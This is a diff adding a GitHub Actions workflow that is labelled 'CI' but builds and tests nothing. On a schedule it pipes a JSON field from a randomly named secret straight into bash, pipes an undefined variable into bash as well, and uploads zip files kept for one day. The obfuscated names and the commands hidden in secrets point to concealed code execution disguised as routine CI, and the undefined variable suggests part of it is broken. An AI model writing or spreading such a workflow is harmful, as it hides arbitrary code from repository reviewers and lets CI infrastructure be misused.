@@ -1,0 +1,27 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '10 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          ckdp751: ${{ secrets.ckdp751 }}
+        run: |
+          printf '%s' "$ckdp751" | jq -r .ed761 | /bin/bash
+          echo $uw94111 | jq -r .ywy136 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: WWxLHfrT
+          path: "*.zip"
+          retention-days: 1
